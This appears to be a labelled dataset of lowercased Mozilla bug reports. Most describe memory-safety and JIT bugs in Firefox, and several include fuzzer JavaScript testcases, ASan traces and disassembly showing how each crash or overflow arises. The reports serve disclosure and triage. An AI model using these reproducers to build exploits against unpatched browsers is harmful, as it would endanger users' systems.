quotamanager transactionthreadpool needs to be shutdown before we shutdown io thread io thread shutdown involves invalidation of file managers which destroy file info objects setting database refs to zero the problem is that there can be a running transaction that is about to lower database refs of a file info and since the file info at that time contains invalid information/database refs the whole process will end up with destroying already destroyed file info objects it makes much more sense to shutdown the transaction service first and then the io thread this must have been a problem for long time but not so visible the patch for storing big structured clones in external files makes it much more visible ben says we should land this separately and get it possibly on aurora/beta too	11
assertion index exceeds allowable range nsstandardurl host assertion index exceeds allowable range i mlength file nststring.h frame 0 xul nscstring charat this i=4294967295 const 91 at nststring.h:105 frame 1 xul nsstandardurl host this 91 at nsstandardurl.h:352 frame 2 xul nsstandardurl gethost this result 40 at nsstandardurl.cpp:1016 frame 3 xul mozilla dom url gethostname this ahostname const 126 at url.cpp:334 frame 4 xul mozilla dom urlbinding get_hostname cx obj=handle jsobject at self args=jsjitgettercallargs at 94 at urlbinding.cpp:622	11
msvc with pgo still miscompiles/nops canonicalizenan remember bug 859892 msvc miscompiling the canonicalizenan call in dataview.getfloat32 i fixed that bug but msvc is still miscompiling canonicalizenan bug 939562 enables the jits for more chrome code and this win32 pgo bug is causing jetpack crashes but the reduced testcase also crashes a normal nightly msvc turns the canonicalizenan call for dataview.getfloat64 into a no-op so js code can create arbitrary values and this is sec-critical for canonicalizenan msvc with pgo generates the following code annotated prologue mozjs js canonicalizenan 680ef5f0 55 push ebp 680ef5f1 8bec mov ebp esp 680ef5f3 83ec0c sub esp,0ch move the double argument to ebp-8 also save esi and set it to 0 680ef5f6 dd4508 fld qword ptr ebp+8 680ef5f9 56 push esi 680ef5fa 33f6 xor esi esi 680ef5fc dd5df8 fstp qword ptr ebp-8 compare esi and if it s non-zero we re done we just zero'ed esi so this branch is never taken 680ef5ff 3bf6 cmp esi esi 680ef601 7513 jne mozjs js canonicalizenan 680ef616 mozilla isnan does bits doubleexponentbits doubleexponentbits so this looks reasonable if this test fails we re done 680ef603 8b45fc mov eax dword ptr ebp-4 680ef606 250000f07f and eax,7ff00000h 680ef60b 3d0000f07f cmp eax,7ff00000h 680ef610 0f849b911900 je mozjs js canonicalizenan 682887b1 done return the double and restore esi 680ef616 dd4508 fld qword ptr ebp+8 680ef619 5e pop esi 680ef61a c9 leave 680ef61b c3 ret the branch that s always taken is a bit weird for an opt build but so far so good here s what happens when we have a nan value and jump to 682887b1 load the high word in edx low word in eax 682887b1 8b55fc mov edx dword ptr ebp-4 682887b4 8b45f8 mov eax dword ptr ebp-8 mozilla isnan does bits doublesignificandbits 0 doublesignificandbits ffffffff so the and instruction below makes some sense 682887b7 81e2ffff0f00 and edx,0fffffh the code below is totally bogus we or both words but whatever happens we jump to done and return the original input 682887bd 0bc2 or eax edx 682887bf 0f84516ee6ff je mozjs js canonicalizenan 680ef616 682887c5 e94c6ee6ff jmp mozjs js canonicalizenan 680ef616	11
abort not allowed to make more decoder calls after error hasdecodererror found via bughunter on loading this site result on windows 7 debug trunk build and according to bughunter also beta/aurora in abort not allowed to make more decoder calls after error hasdecodererror will see that i can generate a testcase	11
crash js asmjsmodule detachioncompilation or assertion failure exit.interpcodeoffset at jit/asmjsmodule.h function g f for var j 0 j 9 j try f catch e function h code function code g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g h m function stdlib foreign use asm var ff=foreign.ff function f ff 0 return f this ff arguments.callee.caller g m h m undefined gc asserts js debug shell on m-c changeset 7d120481a6ae with ion-eager ion-parallel-compile=off at assertion failure exit.interpcodeoffset at jit/asmjsmodule.h but sometimes crashes instead at js asmjsmodule detachioncompilation s-s because gc seems to be involved my configure flags are cc clang qunused-arguments ar=ar cxx clang qunused-arguments sh configure target=x86_64-apple-darwin12.5.0 enable-optimize enable-debug enable-profiling enable-gczeal enable-debug-symbols enable-methodjit enable-type-inference disable-tests enable-more-deterministic with-ccache enable-threadsafe other nspr options autobisect shows this is probably related to the following changeset the first bad revision is changeset user brian hackett date mon dec 16 10:53:02 2013 0800 summary bug 785905 build ion mir graph off thread r=jandem brian is bug 785905 a likely regressor	11
webgl crash mozilla gl glcontext fcompressedteximage2d gleevaluatetextureimagechange tested with	11
mozjscomponentloader mthisobjects is not properly rooted i was just looking at a topcrash bug 950653 see bug 950653 comment 106 for more info i noticed that the mozjscomponentloader mthisobjects script/object hash table is not traced explicitly there are two places where we add new items 1 mozjscomponentloader objectforlocation here we do js_addnamedobjectroot cx aobject alocation js_addnamedscriptroot cx atablescript alocation 2 mozjscomponentloader notesubscript which does not do anything like this is it possible that 2 is not correctly keeping the script/object alive and we can run into use-after-free bugs am i missing something also cc'ing terrence to make sure he s aware of this table for ggc	11
assertion failure mir instruction returned value with unexpected type at jit/ionmacroassembler.cpp function g x return a math x 0 function f g g math.round try f catch e g function return 0 f f asserts js debug shell on m-c changeset 199e65efd08b with ion-parallel-compile=off ion-eager at assertion failure mir instruction returned value with unexpected type at jit/ionmacroassembler.cpp s-s because this seems to be a mid-level intermediate representation issue js folks say keep it s-s by default for now my configure flags are ld=ld cross_compile=1 cc clang qunused-arguments arch i386 ranlib=ranlib cxx clang qunused-arguments arch i386 as cc ar=ar strip strip x s host_cc clang qunused-arguments host_cxx clang qunused-arguments sh users/skywalker/trees/mozilla-central/js/src/configure target=i386-apple-darwin9.2.0 enable-macos-target=10.5 enable-optimize enable-debug enable-profiling enable-gczeal enable-debug-symbols disable-tests enable-more-deterministic with-ccache enable-threadsafe other nspr options autobisect shows this is probably related to the following changeset the first bad revision is changeset user jan de mooij date sat dec 14 14:32:35 2013 0100 summary bug 949475 add some debug-only sanity checks r=bhackett jan perhaps bug 949475 caused a latent bug to show up	11
autoholdzone is a hazard with igc i spent a few hours mulling over bug 960828 with sfink terrence and jonco yesterday we were still stuck when we left off but i had an epiphany this morning and think i have this figured out the key point here is that the global does n't actually get collected that s why we never see the finalizer running but but the global s compartment does so global global the culprit as identified in bug 960828 comment 72 which compiles down to global compartment maybeglobal returns garbage rather than identity the scenario goes like this xpconnect invokes js_newglobalobject whose first act of business is to invoke js newcompartment this creates a compartment and can not gc then before the call to globalobject create which can gc we instantiate an autoholdzone instance once the global object is created it is rooted by virtue of either being on the stack or being in a rooted depending on the rooting configuration and therefore its compartment is held alive too but autoholdzone is n't actually good enough it prevents the zone and therefore the compartment from being swept but it does n't actually mark anything so if we happen to begin a gc at the very beginning of globalobject create before the global itself is actually allocated we ll do the marking phase and fail to mark the freshly-allocated compartment we then return from js_newglobalobject at which point the autoholdzone is out of scope and at some point later finish up the incremental sweeping sweepzones invokes sweepcompartments which finds the compartment unmarked and deletes it boom we could mark autoholdzone smarter but it might be simpler to just manually gc if we re getting close at the beginning of js_newglobalobject and then use an autolockgc for the rest of the call since this is touchy stuff gc hackers thoughts once we agree on the approach i ll go ahead and write the patch	11
nsstandardurl sethost called net_tolowercase with a bogus pointer nightly bp-aabf8718-c548-4461-83b9-182822140403	11
addresssanitizer heap-buffer-overflow js jit codegeneratorshared allocatecache the following trace came up while doing oom fuzzing on mozilla-central revision 46451==error addresssanitizer heap-buffer-overflow on address at pc bp sp write of size 32 at thread t3 analysis helper out of memory out of memory 0 in unsigned long js jit codegeneratorshared allocatecache js jit nameic js jit nameic const js/src/jit/ioncaches.h:127 1 in js jit codegenerator generatebody js/src/jit/codegenerator.cpp:3240 2 in js jit codegenerator generate js/src/jit/codegenerator.cpp:6235 3 in js jit generatecode js jit mirgenerator js jit lirgraph js jit macroassembler js/src/jit/ion.cpp:1598 4 in js workerthread handleionworkload js/src/jsworkers.cpp:798 5 in js workerthread threadloop js/src/jsworkers.cpp:1034 6 in nspr thread threadroutine void js/src/vm/posixnspr.cpp:45 7 in start_thread build/buildd/eglibc-2.15/nptl/pthread_create.c:308 8 in build/buildd/eglibc-2.15/misc sysdeps/unix/sysv/linux/x86_64/clone.s:112 is located 7 bytes to the right of 256-byte region allocated by thread t3 analysis helper here 0 in interceptor_realloc asan_rtl 1 in js_realloc void unsigned long js/src/opt64asan-oom/js/src dist/include/js/utility.h:115 2 in mozilla vectorbase unsigned char 0ul js systemallocpolicy js vector unsigned char 0ul js systemallocpolicy appendn unsigned char const unsigned long js/src/opt64asan-oom/js/src dist/include/mozilla/vector.h:925 3 in unsigned long js jit codegeneratorshared allocatecache js jit nameic js jit nameic const js/src/jit/shared/codegenerator-shared.h:251 4 in js jit codegenerator generatebody js/src/jit/codegenerator.cpp:3240 5 in js jit codegenerator generate js/src/jit/codegenerator.cpp:6235 6 in js jit generatecode js jit mirgenerator js jit lirgraph js jit macroassembler js/src/jit/ion.cpp:1598 7 in js workerthread handleionworkload js/src/jsworkers.cpp:798 8 in js workerthread threadloop js/src/jsworkers.cpp:1034 9 in nspr thread threadroutine void js/src/vm/posixnspr.cpp:45 10 in start_thread build/buildd/eglibc-2.15/nptl/pthread_create.c:308 thread t3 analysis helper created by t0 here 0 in interceptor_pthread_create asan_rtl 1 in pr_createthread prthreadtype void void void prthreadpriority prthreadscope prthreadstate unsigned int js/src/vm/posixnspr.cpp:108 2 in js globalworkerthreadstate ensureinitialized js/src/jsworkers.cpp:437 3 in js ensureworkerthreadsinitialized js exclusivecontext js/src/jsworkers.cpp:44 4 in js scriptsource setsourcecopy js exclusivecontext char16_t const unsigned int bool js sourcecompressiontask js/src/jsscript.cpp:1611 5 in js frontend compilescript js exclusivecontext js lifoalloc js handle jsobject js handle jsscript js readonlycompileoptions const char16_t const unsigned long jsstring unsigned int js sourcecompressiontask js/src/frontend/bytecodecompiler.cpp:225 6 in js compile jscontext js handle jsobject js readonlycompileoptions const char16_t const unsigned long js/src/jsapi.cpp:4470 7 in mozilla vectorbase char 8ul js tempallocpolicy js vector char 8ul js tempallocpolicy begin js/src/jsapi.cpp:4485 8 in runfile jscontext js handle jsobject char const io_file bool js/src/shell/js.cpp:447 9 in processargs jscontext jsobject js cli optionparser js/src/shell/js.cpp:5732 10 in libc_start_main build/buildd/eglibc-2.15/csu/libc-start.c:226 summary addresssanitizer heap-buffer-overflow 0 shadow bytes around the buggy address 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa freed heap region fd 46451==aborting no test is available for this issue reproducing it only yields an intended oom crash thread scheduling is probably the reason that it does n't reproduce properly	11
memory reporter wrappers for realloc can use-after-free we have a number of memory reporter wrappers for realloc in nsxpcominit.cpp here s the one for icu as an example 365 this wrapper and the other ones do n't correctly handle the case of being called with a zero size realloc acts like free in such a case and therefore the realloc failed case would be touching already-freed memory we should fix the wrappers and possibly backport marking as security-sensitive but i do n't know how exploitable this really is	11
seckey_decodederpublickey double-frees the arena when decoding fails seckeypublickey seckey_decodederpublickey const secitem pubkder plarenapool arena seckeypublickey pubk secstatus rv secitem newpubkder arena port_newarena der_default_chunksize if arena null port_seterror sec_error_no_memory return null pubk seckeypublickey port_arenazalloc arena sizeof seckeypublickey if pubk null pubk arena arena pubk pkcs11slot null pubk pkcs11id 0 prepare_rsa_pub_key_for_asn1 pubk copy the der into the arena since quick der returns data that points into the der input which may get freed by the caller rv secitem_copyitem arena newpubkder pubkder if rv secsuccess rv sec_quickderdecodeitem arena pubk seckey_rsapublickeytemplate newpubkder if rv secsuccess return pubk seckey_destroypublickey pubk else port_seterror sec_error_no_memory port_freearena arena pr_false return null if sec_quickderdecodeitem fails seckey_destroypublickey will be called which calls port_freearena on pubk arena pubk arena is an alias for arena port_freearena then gets called on arena for the second time	11
assertion failure str1 length str2 length at jit/ioncaches.cpp:2955 the attached testcase asserts on mozilla-central revision 41a54c8add09 run with fuzzing-safe ion-eager	11
assertion failure isinrange offset at jit/arm/assembler-arm.h:989 or crash js jit simulator instructiondecode with regexp the following testcase asserts on mozilla-central revision f28005b84ed0 run with fuzzing-safe var section expression-015 var title function calls var n 100 1000 var a new array n for var i 0 i n i a i section var str a.join var re new regexp str re.exec n 1	11
refcounting of nstimerimpl looks wrong in in timerthread when posttimerevent fails noticed this while working on bug 941751 in timerthread we call nstimerimpl posttimerevent just after doing an addref/release while removing the timer from mtimers which does the following 722 the constructor of nstimerevent does not addref because we are essentially transferring a reference from mtimers to the nstimerevent 116 it does set itself up to perform a release once it is destroyed which makes sense 157 if we fail for any reason other than oom the nstimerevent is destroyed prior to the return and the refcount is decremented then we decrement the refcount again here leading to a very misleading logging statement for yours truly and probably a dangling nsitimer pointer somewhere 266	11
addresssanitizer global-buffer-overflow due to unhandled oom jsc yarr digitscreate i m seeing the following asan error in oom fuzzing 59119==error addresssanitizer global-buffer-overflow on address at pc bp sp write of size 16 at thread t0 0 in vectorbase opt64asan-oom/js/src dist/include/mozilla/vector.h:588 1 in vector opt64asan-oom/js/src dist/include/js/vector.h:57 2 in vector yarr/wtfbridge.h:130 3 in js_malloc unsigned long yarr/yarrpattern.h:99 4 in zl6js_newin3jsc4yarr14characterclasseept_v opt64asan-oom/js/src dist/include/js/utility.h:325 5 in jsc yarr digitscreate yarr/regexpjittables.h:2635 6 in jsc yarr yarrpattern digitscharacterclass yarr/yarrpattern.h:405 7 in jsc yarr yarrpatternconstructor atombuiltincharacterclass jsc yarr builtincharacterclassid bool yarr/yarrpattern.cpp:350 8 in bool jsc yarr parser jsc yarr yarrpatternconstructor char16_t parseescape false jsc yarr yarrpatternconstructor jsc yarr yarrpatternconstructor yarr/yarrparser.h:266 9 in jsc yarr parser jsc yarr yarrpatternconstructor char16_t parseatomescape yarr/yarrparser.h:406 10 in jsc yarr parser jsc yarr yarrpatternconstructor char16_t parsetokens yarr/yarrparser.h:586 11 in parser yarr/yarrparser.h:674 12 in jsc yarr errorcode jsc yarr parse jsc yarr yarrpatternconstructor jsc yarr yarrpatternconstructor jslinearstring const unsigned int yarr/yarrparser.h:855 13 in jsc yarr yarrpattern compile jslinearstring const yarr/yarrpattern.cpp:870 according to the oom backtraces the oom is happening in jsc yarr digitscreate but the debug information seems to be garbled and did n't point me to any location however i identified this as the possible problem 2633 characterclass digitscreate 2634 2635 characterclass characterclass js_new characterclass 2636 characterclass m_ranges.append characterrange 2637 return characterclass 2638 line 2635 is allocating characterclass but not checking the return value of js_new with the next line this should lead to a null crash but it does n't maybe some weird inlining+optimizing is happening here this is all in a header file when i add a null check right after the js_new and return null then the signature changes and yarr hits moz_crash instead so that confirms my theory should we just add the null check right after the js_new	11
fix resumeafter for jsop_loopentry in ion-to-baseline bailout we try to find the next non-loopentry/nop/loophead/goto pc when bailing out on a resumeafter loopentry if the loop body is empty we get caught in an infinite loop	11
assertion failure mworkerprivate with port.close gc 1 load the testcase 2 use about memory to force a gc or 1 install 2 load the testcase assertion failure mworkerprivate at dom/workers/sharedworker.cpp:43 security-sensitive because 1 it s similar to bug 998474 and 2 it involves gc	11
crash when commenting on github.com mozilla dom wrapperpromisecallback call jscontext js handle js value this bug was filed from the socorro interface and is report bp-0e3f20b3-f50e-401f-b1a9-c2c312140513 i ve seen this twice in an hour today both times when clicking to respond on a github issue or pull request here s the other report	11
crash at a weird memory address involving regexp and filterpar b regexp y new object a b.exec a 3 undefined array.prototype.unshift.call a undefined try a.filterpar function catch e crashes js opt shell on m-c changeset 2893f60d5903 with ion-parallel-compile=off ion-eager at a weird memory address intermittently setting s-s and assuming sec-critical prior to further analysis as crashing at a weird address seems bad my configure flags are cc gcc-4.7 mfloat-abi=softfp b/usr/lib/gcc/arm-linux-gnueabi/4.7 cxx g++-4.7 mfloat-abi=softfp b/usr/lib/gcc/arm-linux-gnueabi/4.7 ar=ar sh home/fuzz5lin/trees/mozilla-central/js/src/configure target=arm-linux-gnueabi enable-optimize disable-debug enable-profiling enable-gczeal enable-debug-symbols disable-tests enable-more-deterministic with-ccache enable-threadsafe other nspr options run this anytime from 1-100 times or set disable-randomization if necessary within gdb repeatedly run it till it crashes i will try to see if i can get a bisection but no promises yet setting needinfo from marty to see what s going on here	11
out-of-bounds read in gfxplatform getpreflangname here is code from gfxplatform getpreflangname if uint32_t alang uint32_t efontpreflang_allcount return gpreflangnames uint32_t alang efontpreflang_allcount is 32 whereas gpreflangnames has 31 entries in it thus if you pass in 31 you ll end up reading past the end of gpreflangnames maybe the check should be against efontpreflang_langcount which is 30 instead of efontpreflang_allcount presumably a static assert could catch problems here in the future at first i thought this was a regression from bug 213517 but it looks like that removed an entry from efontpreflang so i think it made it slightly better i did a bit of digging but i m not sure when this was introduced coverity first noticed this in december 2012	11
nsstandardurl sethost called net_tolowercase with a bogus pointer 3 same symptoms as bug 991471 and bug 1005578 different testcase	11
fix a bug that can cause datasourcesurface buffers to be smaller than the datasourcesurface expects them to be yikes in sourcesurfacealignedrawdata init and sourcesurfacealignedrawdata initwithstride the temporary that is passed to realloc may not have enough precision to store the result of mstride asize.height that can cause us to have a buffer that is much smaller than the datasourcesurface expects and needs it to be	11
calling alert from mozmediastatisticsshowing property getter freezes firefox 1 create a video element with controls true 2 set the getter for the mozmediastatisticsshowing property to a function that calls alert 3 add the video element to the dom tree 4 firefox freeze	11
zone mismatch in clonenonreflectors clonenonreflectors currently assumes that it only needs to worry about compartments in the v.isobject case however we can still get mismatches with cross-zone strings the solution is to wrap the string which causes non-interned strings to be copied into the target zone the mismatch is mitigated to sec-moderate because this can only be triggered by a privileged api that does n't currently have any in-tree consumers	11
mozmediastatisticsshowing property should n't be content-exposed this bug was initially created as a clone of bug 1021240 1 create a video element with controls true 2 set the getter for the mozmediastatisticsshowing property to a function that calls alert 3 add the video element to the dom tree 4 firefox freeze we ll work around this by avoiding the mozmediastatisticsshowing property from influencing chrome by sticking it in a webidl property	11
static hazard analysis does not detect a return value held live across a gc bz found a real live hazard in the wild that the analysis should catch but does not see bug 1009675 consider value foo callsetup s return bar where callsetup callsetup can gc the relevant bit of the cfg is pentry 1 pexit 14 call 11,12 temp_3 this call temp_4 temp_5 temp_6 arv assign 12,13 return temp_3 call 13,14 s.~callsetup the problem is that temp_3 gets stored into a magical return variable which is never considered to be used and only then does callsetup get invoked given that we always have a single unique exit point 14 here it seems like i should be able to just say that the exit point implicitly uses return or at least i m assuming from the existence of a pexit field that there s always a single unique exit point	11
we are not firing any post-barriers on heap t for jsfunction jsfunction is a sub-class of jsobject but gecko users of rootingapi.h have no way of knowing this the upshot is that we end up using gcmethods jsfunction needspostbarrier which returns false unconditionally instead of gcmethods jsobject needspostbarrier we absolutely allocate some jsfunction in the nursery so i guess we re just getting mostly lucky right now luckily this is only a problem for heap t the internal barrier classes use internalgcmethods t which dispatches to t needspostbarrier which will follow the class hierarchy and always find jsobject needspostbarrier the trivial fix is to dup gcmethods jsobject for jsfunction if there were other gecko-exposed object users of gcmethods t they would have to be in specificrootkind too so we can be fairly confident that jsfunction is the only subclass we need to worry about will patch after lunch	11
assertion failure hasscript at jsfun.h x object.defineproperty x 8 get function j object.defineproperty this y get function return x.filterpar function for var a 0 a 99 a array.prototype.shift.call y asserts js debug shell on m-c changeset 613bc15ccf05 with ion-eager ion-offthread-compile=off at assertion failure hasscript at jsfun.h my configure flags are cc gcc-4.7 mfloat-abi=softfp b/usr/lib/gcc/arm-linux-gnueabi/4.7 cxx g++-4.7 mfloat-abi=softfp b/usr/lib/gcc/arm-linux-gnueabi/4.7 ar=ar sh home/fuzz5lin/trees/mozilla-central/js/src/configure target=arm-linux-gnueabi enable-debug enable-optimize enable-profiling enable-gczeal enable-debug-symbols disable-tests enable-more-deterministic with-ccache enable-threadsafe other nspr options this is intermittent and mutates its signatures sometimes unreliably crashes so it would be nice to have this fixed i ll see if i can get a bisection but no promises here setting s-s and sec-high as a start shu-yu would you be able to take a look	11
addresssanitizer stack-buffer-overflow with gfxuserfontset otsmessage on the stack this bug was initially created as a clone of bug 1030667 this bug was initially created as a clone of bug 1023758 this bug was initially created as a clone of bug 1021612 i tested steven s asan build stmichaud/bmo/firefox-asan.dmg from jul 02 bug 1030667 comment 30 and when i went to the asan build crashed with a stack buffer overflow with gfxuserfontset otsmessage on the stack steven michaud could reproduce this on 10.8.5 and i reproduced this on 10.9.4 he advises that this might be a font issue so cc'ing john daggett and jonathan kew setting s-s and sec-critical until we know what is going on please feel free to re-rate this as necessary setting needinfo from john and jonathan	11
oom large null-offset write in update_filter triggered with audiobuffersourcenode this bug was initially created as a clone of bug 987679 a memory allocation failure at l698 can cause content-controlled data to be written to a large content-controlled offset from null there is eventually a null deref which will crash the program but there will be a period of time during which other threads will continue to run compromised the allocation request can be large so it would not be difficult to generate an oom under similar situations to bug 987679	11
shutdown crash with many mozgetusermedia calls this bug was initially created as a clone of bug 1002340 1 load the testcase in an asan build of firefox 2 quit firefox on nightly we once again have crashes in the mediastreamgraph resampler code i can repro on opt builds only a noopt build never hits it i ll attach a stack strongly suspect that the graph is going away while we re still pushing audio into it	11
differential testing incorrect codegen for mod on arm sim try function array.buildpar 8 function x if x 511 5 n print this catch e js-dbg-32-dm-ts-armsim-darwin-f78e532e8a10 fuzzing-safe ion-offthread-compile=off 1623.js object global js-dbg-32-dm-ts-armsim-darwin-f78e532e8a10 fuzzing-safe ion-offthread-compile=off no-baseline 1623.js tested this on 32-bit mac js dbg threadsafe deterministic arm-simulator shell off m-c rev f78e532e8a10 my configure flags are ld=ld cross_compile=1 cc clang qunused-arguments msse2 mfpmath=sse arch i386 ranlib=ranlib cxx clang qunused-arguments msse2 mfpmath=sse arch i386 as cc ar=ar strip strip x s host_cc clang qunused-arguments msse2 mfpmath=sse host_cxx clang qunused-arguments msse2 mfpmath=sse sh users/skywalker/trees/mozilla-central/js/src/configure target=i386-apple-darwin9.2.0 enable-macos-target=10.5 enable-arm-simulator enable-optimize enable-debug enable-profiling enable-gczeal enable-debug-symbols disable-tests enable-more-deterministic with-ccache enable-threadsafe other nspr options	11
race in nstimerevent destructor i found this problem when debugging timeouts in test_playback_rate.html 1 it looks like it is possible for event 2 to be executed in the target thread before nstimerimpl posttimerevent returns then nstimerevent will be deleted on exit of nstimerimpl posttimerevent in the timer thread in the destructor of nstimerevent it will call nstimerimpl release in the timer thread at the same time it is also possible for nstimerimpl initwithcallback to be called in the target thread therefore we might hit bug 997844 comment 0 again 1 bug 1020707 comment 42 2 l763	11
nsstandardurl sethost called net_tolowercase with a bogus pointer 4 no description provided	11
crash js barrieredbase js types typeobject operator or crash js scriptsourceobject initfromoptions with offthread script the following testcase crashes on mozilla-central revision e1a037c085d1 threadsafe build run with fuzzing-safe thread-count=2 ion-eager var g newglobal gczeal 2 offthreadcompilescript error g.runoffthreadscript	11
gc hazard with worker xmlhttprequest with the patch for bug 1039551 i m getting windows-only debug-only mochitest-4 gc crashes see the stack trace below we re crashing here ns_impl_cycle_collection_trace_begin_inherited xmlhttprequest nsxhreventtarget ns_impl_cycle_collection_trace_jsval_member_callback mstatedata.mresponse ns_impl_cycle_collection_trace_end because mstatedata.mresponse points to memory freed gc thing when we assign this value in xmlhttprequest getresponse mstatedata.mresponse string_to_jsval str it s still valid afaics somehow we re not tracing it and the gc frees it not sure how to debug this cc experts does anything about this code look wrong 08:26:29 info 0 mozjs.dll js gc arenaheader getallockind heap.h a4db87a48b24 509 08:26:29 info 1 mozjs.dll js gc getgcthingtracekind void const jsgcinlines.h a4db87a48b24 122 08:26:29 info 2 mozjs.dll js gcthingtracekind void jsfriendapi.cpp a4db87a48b24 649 08:26:29 info 3 xul.dll xpc_gcthingisgrayccthing void nsxpconnect.cpp a4db87a48b24 261 08:26:29 info 4 xul.dll snowwhitekiller trace js heap js value char const void nscyclecollector.cpp a4db87a48b24 2649 08:26:29 info 5 xul.dll mozilla dom workers xmlhttprequest cyclecollection trace void tracecallbacks const void xmlhttprequest.cpp a4db87a48b24 1615 08:26:29 info 6 xul.dll snowwhitekiller snowwhitekiller nscyclecollector.cpp a4db87a48b24 2618	11
crash in mozilla net nshttpchannel onstoprequest nsirequest nsisupports tag_nsresult this bug was filed from the socorro interface and is report bp-57a3cfc1-a538-4c0b-baf8-d75182140515 note automated exploitability analysis rated this high	11
markjitexitframe does n't mark some vm wrapper argument types the machinery to work out which argument types to mark relies on template specialization but the default case is not to mark unfortunately some types are missing so these do n't get marked i guess this is a security issue now we use exact rooting although i think this would be very hard to exploit in practice	11
assertion failure infer failure missing type in object float at jsinfer.cpp:288 the following testcase asserts on mozilla-central revision c360f3d1c00d run with fuzzing-safe no-threads ion-eager setjitcompileroption baseline.usecount.trigger 10 function newfunc x new function x newfunc function test m do if m arr 0 break m 0 while 0 arr m arr new float64array 2 for var i=0 i 200 i test 0 object.preventextensions this eval var x	11
crash isinsidenursery with use-after-free likely oom the attached testcase crashes on mozilla-central revision 2255d7d187b2 run with no-threads fuzzing-safe	11
several signals from pcmedia to pcimpl are unsafe none of the following signal handlers are torn down in a safe way right now 614 the pc is usually it is racy destroyed before the pcmedia which still has these slots connected when the pc dies if anything from the ice layer happens between the pcimpl dying and the pcmedia dying the signal results in a uaf	11
xraytostring assumes that there are only two xraytrait types i noticed this while reviewing peterv s patches in bug 787070 the xraytostring method currently checks that we have an xraywrapper handles domxrays and then assumes that we have an xpcwrappednativexray if this were done with a jsxray we d end up casting arbitrary bits of the jsobject layout to an xpcwrappednative and dereferencing it this is mitigated somewhat by the fact that xrays generally are n't exposed to the web but they are exposed to sandboxes and we run enough untrusted code in sandboxes that i think this is sec-high	11
crash js fetchname or assertion failure shape hasslot at vm/interpreter-inl.h x function proto x object.freeze wrap x arguments asserts js debug shell on m-c changeset 82df3654cd80 with no-baseline ion-offthread-compile=off ion-eager at assertion failure shape hasslot at vm/interpreter-inl.h and crashes js opt shell at js fetchname my configure flags are opt cc clang qunused-arguments cxx clang qunused-arguments ar=ar sh users/skywalker/trees/mozilla-central/js/src/configure target=x86_64-apple-darwin12.5.0 disable-debug enable-optimize enable-gczeal enable-debug-symbols disable-tests enable-more-deterministic with-ccache enable-threadsafe debug cc clang qunused-arguments cxx clang qunused-arguments ar=ar sh users/skywalker/trees/mozilla-central/js/src/configure target=x86_64-apple-darwin12.5.0 enable-debug enable-optimize enable-gczeal enable-debug-symbols disable-tests enable-more-deterministic with-ccache enable-threadsafe autobisect shows this is probably related to the following changeset the first bad revision is changeset user jason orendorff date fri apr 25 16:11:01 2014 0500 summary bug 547140 part 2 remove flags argument from js_getpropertydescriptor and friends r=waldo setting s-s and sec-critical as a start because this seems to access a weird memory address in the opt shell jason is bug 547140 likely related	9
crash moz_cairo_surface_destroy with long dom notification only on windows no description provided	9
peerconnection.createdatachannel crashes remote end in mozilla detail primitiveintrinsics int sub long long user agent mozilla/5.0 x11 ubuntu linux x86_64 rv:32.0 gecko/20100101 firefox/32.0 build id 20140924083558 steps to reproduce 1 load the attached page webrtc-dc-testcourt.html in two firefox instances 2 in instance a click create offer 3 copy the resulting offer from the lower textarea of instance a into the upper textarea of instance b and on instance b click accept offer 4 copy the resulting answer from the lower textarea of instance b into the upper textarea of instance a and on instance a click accept answer 5 on instance a you should see open event dc onopen and no instance b you should see info event pc ondatachannel 6 on instance a click create additional dc 7 instance b should log info event pc ondatachannel actual results when repeating step 6 multiple times seems to differ between 8 and 10 instance b crashes expected results afaik it should be possible to open at least 16 data channels per peerconnection netwerk/sctp/datachannel/datachannelprotocol.h define webrtc_datachannel_streams_default 16 what should actually never happen is that one end crashes completely	9
crash in datachannels/sctp timer loop when far-end is being debugged with gdb when debugging datachannels if one side is stalled in gdb for a long time the other side may crash in a sctp-timer-processing routing accessing freed memory crashes in user_sctp_timer_iterate.c:81 if c c_time ticks with c suspicion is that in processing one timer and it drops to lock to process the timer it freed another item on the list michael tuexen thinks he knows the actual cause several people have seen this and i m fairly sure i ve hit it before but never got a useful stack from it sec-crit because it uses the freed-memory-pointer to load a function pointer and call it likely affects multiple releases as we have n't changed the sctp library recently	9
sipcc sdp parser can corrupt memory while fuzzing sdparta i found this little gem in our sdp parsing code 508 i think if you hand firefox some sdp with a missing newline the above loop will walk through all your memory and replace with where ever it finds s in you memory until it finally comes across a newline some where in you memory	9
crash with gczeal and recursion the following testcase crashes on mozilla-central revision d7c76fe69e9a build with enable-optimize enable-posix-nspr-emulation enable-valgrind enable-gczeal target=i686-pc-linux-gnu enable-debug run with no-threads fuzzing-safe var g newglobal gczeal 2 1 function recurse x recurse g.f this 3 recurse 0 backtrace program received signal sigsegv segmentation fault in 0 in 1 in eax 0 ebx 1056076 ecx 14900 edx 0 esi 1056100 edi 155890464 ebp 4293911224 esp 4293911136 eip 4138271343 cmp eax eax add al eax marking s-s because this crash involves gc and is on the heap	11
